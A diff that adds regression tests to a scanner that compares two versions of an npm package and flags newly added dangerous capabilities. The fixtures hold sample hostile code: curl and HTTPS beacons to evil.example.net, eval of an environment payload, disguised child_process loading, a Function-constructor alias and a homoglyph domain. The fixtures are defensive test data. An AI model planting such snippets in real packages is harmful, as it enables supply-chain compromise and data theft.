@@ -13,6 +13,17 @@ const safe = path.join(projectRoot, 'fixtures', 'safe-v1');
 const risky = path.join(projectRoot, 'fixtures', 'risky-v2');
 const temporaryPaths: string[] = [];
 
+/** Byte-identical payloads reused across the coverage regressions. */
+const MALICIOUS_BODY = [
+  "const cp = require('child_process');",
+  "const https = require('https');",
+  "cp.execSync('curl http://evil.example.net/$(whoami)');",
+  "https.get('http://evil.example.net/beacon');",
+  'eval(process.env.PAYLOAD);',
+  '',
+].join('\n');
+const MALICIOUS_ENTRY = `#!/usr/bin/env node\n${MALICIOUS_BODY}`;
+
 afterEach(async () => {
   await Promise.all(temporaryPaths.splice(0).map((target) => rm(target, { recursive: true, force: true })));
 });
@@ -108,6 +119,205 @@ describe('analyzeDiff', () => {
     ]));
   });
 
+  it.each([
+    ['extensionless bin entry', { bin: { acme: 'bin/acme' } }, 'bin/acme'],
+    ['extensionless main entry', { main: 'lib/entry' }, 'lib/entry'],
+    ['lifecycle script target', { scripts: { postinstall: 'node hooks/setup' } }, 'hooks/setup'],
+  ])('analyzes a shipped code file selected by %s', async (_label, fields, target) => {
+    const before = await makePackage({
+      'package.json': JSON.stringify({ name: 'acme', version: '1.0.0', ...fields }),
+      [target]: '#!/usr/bin/env node\nconsole.log(1);\n',
+    });
+    const after = await makePackage({
+      'package.json': JSON.stringify({ name: 'acme', version: '1.1.0', ...fields }),
+      [target]: MALICIOUS_ENTRY,
+    });
+    const report = await audit(before, after, { offline: true });
+    expect(report.findings.map((finding) => finding.id)).toEqual(expect.arrayContaining([
+      'capability.added.child_process',
+      'capability.added.dynamic-code',
+      'capability.added.network',
+    ]));
+    expect(report.risk.level).toBe('critical');
+  });
+
+  it('analyzes a shipped code file that only a JavaScript shebang identifies', async () => {
+    const before = await makePackage({
+      'package.json': JSON.stringify({ name: 'acme', version: '1.0.0' }),
+      tool: '#!/usr/bin/env node\nconsole.log(1);\n',
+    });
+    const after = await makePackage({
+      'package.json': JSON.stringify({ name: 'acme', version: '1.1.0' }),
+      tool: MALICIOUS_ENTRY,
+    });
+    const report = await audit(before, after, { offline: true });
+    expect(report.findings.map((finding) => finding.id)).toContain('capability.added.child_process');
+  });
+
+  it('does not parse a shell script as JavaScript even when the manifest points at it', async () => {
+    const before = await makePackage({
+      'package.json': JSON.stringify({ name: 'acme', version: '1.0.0', bin: { acme: 'bin/acme.sh' } }),
+      'bin/acme.sh': '#!/bin/sh\necho one\n',
+    });
+    const after = await makePackage({
+      'package.json': JSON.stringify({ name: 'acme', version: '1.1.0', bin: { acme: 'bin/acme.sh' } }),
+      'bin/acme.sh': '#!/bin/sh\nfor value in a b; do echo "$value"; done\n',
+    });
+    const report = await audit(before, after, { offline: true });
+    expect(report.findings.map((finding) => finding.id)).not.toContain('analysis.parse-failure');
+  });
+
+  it('fails closed when a shipped code file exceeds the analyzed-text limit', async () => {
+    const before = await makePackage({
+      'package.json': JSON.stringify({ name: 'acme', version: '1.0.0' }),
+      'index.js': 'export const ok = 1;\n',
+    });
+    const after = await makePackage({
+      'package.json': JSON.stringify({ name: 'acme', version: '1.1.0' }),
+      'index.js': `${MALICIOUS_ENTRY}\n/*${'x'.repeat(400)}*/\n`,
+    });
+    const report = await audit(before, after, { offline: true, limits: { maxTextBytes: 256 } });
+    const gap = report.findings.find((finding) => finding.id === 'analysis.unanalyzed-code');
+    expect(gap?.severity).toBe('high');
+    expect(gap?.evidence[0]?.file).toBe('index.js');
+    expect(gap?.evidence[0]?.message).toMatch(/analyzed-text limit/);
+    expect(report.risk.score).toBeGreaterThanOrEqual(25);
+  });
+
+  it('keeps lexical capabilities and reports the coverage loss when the parser fails', async () => {
+    const before = await makePackage({
+      'package.json': JSON.stringify({ name: 'acme', version: '1.0.0' }),
+      'index.js': 'export const ok = 1;\n',
+    });
+    const after = await makePackage({
+      'package.json': JSON.stringify({ name: 'acme', version: '1.1.0' }),
+      'index.js': `const x = ${'('.repeat(900)}1${')'.repeat(900)};\n${MALICIOUS_BODY}`,
+    });
+    const report = await audit(before, after, { offline: true });
+    const ids = report.findings.map((finding) => finding.id);
+    expect(ids).toContain('analysis.parse-failure');
+    expect(ids).toContain('capability.added.child_process');
+    expect(ids).toContain('capability.added.network');
+    expect(report.findings.find((finding) => finding.id === 'analysis.parse-failure')?.severity).toBe('high');
+    expect(report.risk.level).toBe('critical');
+  });
+
+  it('parses a TypeScript legacy cast without forcing the conflicting jsx plugin', async () => {
+    const before = await makePackage({
+      'package.json': JSON.stringify({ name: 'acme', version: '1.0.0' }),
+      'index.ts': 'export const ok = 1;\n',
+    });
+    const after = await makePackage({
+      'package.json': JSON.stringify({ name: 'acme', version: '1.1.0' }),
+      'index.ts': `const y: unknown = 1;\nconst z = <string>(y as unknown);\n${MALICIOUS_BODY}`,
+    });
+    const report = await audit(before, after, { offline: true });
+    const ids = report.findings.map((finding) => finding.id);
+    expect(ids).toContain('capability.added.child_process');
+    expect(ids).not.toContain('analysis.parse-failure');
+  });
+
+  it('analyzes code whose control bytes defeat the text heuristic', async () => {
+    const noise = String.fromCharCode(1).repeat(600);
+    const before = await makePackage({
+      'package.json': JSON.stringify({ name: 'acme', version: '1.0.0' }),
+      'index.js': 'export const ok = 1;\n',
+    });
+    const after = await makePackage({
+      'package.json': JSON.stringify({ name: 'acme', version: '1.1.0' }),
+      'index.js': `/*${noise}*/\n${MALICIOUS_BODY}`,
+    });
+    const report = await audit(before, after, { offline: true });
+    const ids = report.findings.map((finding) => finding.id);
+    expect(ids).toContain('capability.added.child_process');
+    expect(ids).toContain('obfuscation.control-bytes');
+    expect(report.risk.level).toBe('critical');
+  });
+
+  it.each([
+    ['a member-expression require', "const cp = process.mainModule.require('child_process');\ncp.execSync('id');\n"],
+    ['the internal module loader', "const cp = module.constructor._load('child_process');\ncp.execSync('id');\n"],
+    ['a computed loader property', "const cp = globalThis['req' + 'uire']('child_process');\ncp.execSync('id');\n"],
+  ])('resolves child_process reached through %s', async (_label, body) => {
+    const before = await makePackage({
+      'package.json': JSON.stringify({ name: 'acme', version: '1.0.0' }),
+      'index.js': 'export const ok = 1;\n',
+    });
+    const after = await makePackage({
+      'package.json': JSON.stringify({ name: 'acme', version: '1.1.0' }),
+      'index.js': body,
+    });
+    const report = await audit(before, after, { offline: true });
+    expect(report.findings.map((finding) => finding.id)).toContain('capability.added.child_process');
+  });
+
+  it('flags a code constructor reached through an alias', async () => {
+    const before = await makePackage({
+      'package.json': JSON.stringify({ name: 'acme', version: '1.0.0' }),
+      'index.js': 'export const ok = 1;\n',
+    });
+    const after = await makePackage({
+      'package.json': JSON.stringify({ name: 'acme', version: '1.1.0' }),
+      'index.js': 'const F = (() => {}).constructor;\nF("return process.env")();\n',
+    });
+    const report = await audit(before, after, { offline: true });
+    expect(report.findings.map((finding) => finding.id)).toContain('capability.added.dynamic-code');
+  });
+
+  it('records an internationalized host so a domain policy can match it', async () => {
+    const before = await makePackage({
+      'package.json': JSON.stringify({ name: 'acme', version: '1.0.0' }),
+      'index.js': "fetch('https://good-corp.com/a');\n",
+    });
+    const after = await makePackage({
+      'package.json': JSON.stringify({ name: 'acme', version: '1.1.0' }),
+      // Cyrillic "е" (U+0435) renders like ASCII "e" but is a different host.
+      'index.js': "fetch('https://good-corp.com/a');\nfetch('https://еvil-corp.com/collect');\n",
+    });
+    const report = await audit(before, after, { offline: true });
+    const domains = report.findings.find((finding) => finding.id === 'network.domains.added');
+    expect(domains).toBeDefined();
+    expect(JSON.stringify(domains)).toContain('еvil-corp.com');
+  });
+
+  it('does not let capability names in comments or strings suppress the real capability', async () => {
+    const poison = [
+      '// Never use eval() in this package.',
+      'const doc = "do not call require(\'child_process\') here";',
+      'const note = "process.env is never read";',
+      'const client = "fetch() is not used";',
+      'export const ok = 1;',
+    ].join('\n');
+    const clean = await makePackage({
+      'package.json': JSON.stringify({ name: 'acme', version: '1.0.0' }),
+      'index.js': 'export const ok = 1;\n',
+    });
+    const poisoned = await makePackage({
+      'package.json': JSON.stringify({ name: 'acme', version: '1.0.0' }),
+      'index.js': poison,
+    });
+    const after = await makePackage({
+      'package.json': JSON.stringify({ name: 'acme', version: '1.1.0' }),
+      'index.js': MALICIOUS_BODY,
+    });
+    const expected = ['capability.added.child_process', 'capability.added.dynamic-code', 'capability.added.network', 'capability.added.environment'];
+    expect((await audit(clean, after, { offline: true })).findings.map((finding) => finding.id)).toEqual(expect.arrayContaining(expected));
+    expect((await audit(poisoned, after, { offline: true })).findings.map((finding) => finding.id)).toEqual(expect.arrayContaining(expected));
+  });
+
+  it('does not raise a capability finding for a capability named only in a comment', async () => {
+    const before = await makePackage({
+      'package.json': JSON.stringify({ name: 'acme', version: '1.0.0' }),
+      'index.js': 'export const ok = 1;\n',
+    });
+    const after = await makePackage({
+      'package.json': JSON.stringify({ name: 'acme', version: '1.1.0' }),
+      'index.js': '// Do not use eval() or require("child_process") here.\nexport const ok = 2;\n',
+    });
+    const report = await audit(before, after, { offline: true });
+    expect(report.findings.filter((finding) => finding.id.startsWith('capability.added.'))).toEqual([]);
+  });
+
   it('changes capability fingerprints when behavior changes in the same file', async () => {
     const before = await makePackage({
       'package.json': JSON.stringify({ name: 'fingerprint-test', version: '1.0.0' }),
@@ -154,7 +364,7 @@ function syntheticFile(filePath: string, digest: string, mode: number, kind: Fil
 function syntheticPackage(version: string, entries: Record<string, LoadedFile>): LoadedPackage {
   const packageMetadata: PackageMetadata = {
     name: 'synthetic-package', version, engines: {}, scripts: {}, dependencies: {}, optionalDependencies: {},
-    peerDependencies: {}, devDependencies: {}, bundledDependencies: [], maintainers: [],
+    peerDependencies: {}, devDependencies: {}, bundledDependencies: [], maintainers: [], entryPoints: [],
   };
   const files = new Map(Object.entries(entries));
   return {
